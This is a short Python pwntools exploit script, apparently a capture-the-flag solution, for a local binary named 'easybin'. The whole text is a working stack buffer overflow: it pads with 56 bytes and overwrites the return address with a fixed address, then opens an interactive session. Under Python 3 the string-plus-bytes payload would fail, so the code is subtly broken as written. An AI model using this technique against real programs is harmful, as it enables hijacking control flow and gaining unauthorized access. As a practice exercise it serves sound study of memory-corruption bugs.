from pwn import *

r = process("./easybin")

payload = "A"*56 + p64(0x0000000000401146)
r.sendline(payload)
r.interactive()